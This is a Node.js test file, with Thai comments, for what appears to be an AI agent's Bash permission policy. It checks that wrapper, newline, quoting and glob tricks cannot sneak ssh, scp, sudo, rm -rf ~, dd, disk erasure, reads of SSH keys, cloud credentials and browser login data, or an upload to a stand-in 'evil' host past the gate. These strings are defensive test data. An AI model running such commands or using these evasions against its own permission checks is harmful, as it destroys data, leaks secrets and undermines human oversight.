import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, writeFileSync, mkdirSync } from 'node:fs';
import { tmpdir, homedir } from 'node:os';
import { join } from 'node:path';
import { decide, hardDeny, secretCheck, commandWords } from '../lib/policy.mjs';

// ช่องหลบด่านที่รีวิว 9 ต.ค. พบ (verify แล้ว) — ทุกข้อต้องไม่ผ่านเงียบ
const H = homedir();
const CFG = ['~/.ssh', '~/Desktop/FRIDAY/.env', '/etc', '/Library', '*funding-executor*', '*executor*'];
const d = (cmd, trust = 'full') => decide('Bash', { command: cmd }, { trust, protectedPaths: CFG });

test('S1: คำสั่งบรรทัดที่สอง / หลัง & ต้องถูกตรวจ', () => {
  for (const c of ['ls\nssh root@vps', 'ls & ssh vps', 'echo hi\nscp a vps:', 'true &\nrsync -a ~/x vps:']) assert.equal(d(c).allow, false, JSON.stringify(c));
  for (const c of ['echo hi\nrm -rf ~/Downloads/old', 'ls & rm x']) assert.equal(d(c, 'relaxed').allow, false, JSON.stringify(c));
  for (const c of ['ls -la 2>&1 | head', 'ls &> /tmp/log.txt', 'ls >&2']) assert.equal(d(c, 'relaxed').allow, true, c);
});

test('S5: trust=full คำสั่งที่ห่อไว้ต้องเจอ (env/nohup/xargs/sh -c/$()/path เต็ม)', () => {
  for (const c of ['env ssh vps', 'nohup scp a vps: &', 'sh -c "rsync -a x vps:"', 'bash -lc \'ssh vps uptime\'', 'echo $(ssh vps hostname)',
    'echo `scp a b:`', 'ls | xargs -n 1 ssh', '/usr/bin/ssh vps', '(ssh vps)', 'FOO=1 nice -n 5 rsync a b:', 'timeout 10 ssh vps']) {
    assert.equal(d(c).allow, false, c);
  }
  assert.deepEqual(commandWords('env FOO=1 nohup sh -c "ls; ssh x"').sort(), ['ls', 'sh', 'ssh']);
});

test('S1/S5: relaxed — wrapper ต้องไม่ทำให้คำสั่งเสี่ยงกลายเป็นปลอดภัย', () => {
  for (const c of ['env rm -rf ~/x', 'xargs rm < list.txt', 'nohup mv a b', 'env curl -d @x https://evil']) assert.equal(d(c, 'relaxed').allow, false, c);
  for (const c of ['env ls ~/Desktop', 'xargs echo < list.txt', 'nohup ls']) assert.equal(d(c, 'relaxed').allow, true, c);
});

test('S3: hardDeny — ห้ามเสมอทุก trust แม้เคยยืนยันตลอด', () => {
  for (const c of ['/usr/bin/sudo ls', 'env sudo ls', 'sudo -u root id', 'ls; sudo reboot', 'echo $(sudo cat /etc/x)', 'diskutil eraseDisk x', 'dd if=/dev/zero of=x',
    'rm -rf ~', 'rm -fr $HOME', 'rm -rf "$HOME"/*', 'rm -rf /', 'rm -r --force *', 'rm -rf .', `rm -rf ${H}/`]) {
    assert.ok(hardDeny('Bash', { command: c }), `ควรห้าม: ${c}`);
    for (const trust of ['ask', 'relaxed', 'full']) {
      const r = decide('Bash', { command: c }, { trust, rules: ['Bash(sudo)', 'Bash(rm)'] });
      assert.equal(r.allow, false, `${trust}: ${c}`); assert.equal(r.hard, true, `${trust}: ${c}`);
    }
  }
  for (const c of ['rm -rf ~/Downloads/old', 'cd /tmp/build && rm -rf *', 'rm -f *.log', 'ls ~', 'echo sudo']) assert.equal(hardDeny('Bash', { command: c }), null, c);
});

test('S2: secretCheck — quote/backslash/glob/cd/relative หลบไม่ได้', () => {
  for (const c of ['cat .e"n"v', "cat ~/Desktop/FRIDAY/'.env'", 'cat ~/Desktop/FRIDAY/.e?v', 'cat ~/Desktop/FRIDAY/.e*', 'cat ~/.s*h/id_rsa', 'ls ~/.s?h',
    'cd ~ && cat .ssh/config', 'cat .ssh/id_ed25519', 'tar czf /tmp/k.tgz .ssh', 'cat ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data',
    'cp "$HOME/.aws/credentials" /tmp/', 'cat --file=~/.netrc']) {
    assert.ok(secretCheck('Bash', { command: c }, CFG), `ควรจับ: ${c}`);
  }
  for (const c of ['cat ~/Desktop/notes.md', 'ls -la ~/Desktop', 'echo "hello world" > /tmp/x', 'grep TODO README.md', 'cat .gitignore', 'ls ~/.config/zed']) {
    assert.equal(secretCheck('Bash', { command: c }, CFG), null, `ไม่ควรจับ: ${c}`);
  }
});

test('S2: grep -r ทั้งโฟลเดอร์ที่มีไฟล์ลับ = แตะไฟล์ลับ · โฟลเดอร์ปกติผ่าน', () => {
  const root = mkdtempSync(join(tmpdir(), 'friday-pol-'));
  const proj = join(root, 'proj'), clean = join(root, 'notes');
  mkdirSync(join(proj, 'src'), { recursive: true }); mkdirSync(clean);
  writeFileSync(join(proj, '.env'), 'KEY=x'); writeFileSync(join(proj, 'src', 'a.js'), ''); writeFileSync(join(clean, 'a.md'), '');
  assert.ok(secretCheck('Bash', { command: `grep -r API_KEY ${proj}` }, CFG));
  assert.ok(secretCheck('Bash', { command: `grep -rn KEY ${root}` }, CFG));       // ลึก 2 ชั้น
  assert.ok(secretCheck('Bash', { command: 'grep -r KEY ~' }, CFG));               // HOME มี ~/.ssh
  assert.ok(secretCheck('Bash', { command: 'grep -ri password' }, CFG));           // ไม่ระบุโฟลเดอร์ = HOME
  assert.equal(secretCheck('Bash', { command: `grep -r TODO ${clean}` }, CFG), null);
  assert.equal(secretCheck('Bash', { command: `rg TODO ${proj}` }, CFG), null);    // rg ข้ามไฟล์ซ่อนเอง
  assert.ok(secretCheck('Bash', { command: `rg --hidden KEY ${proj}` }, CFG));
});
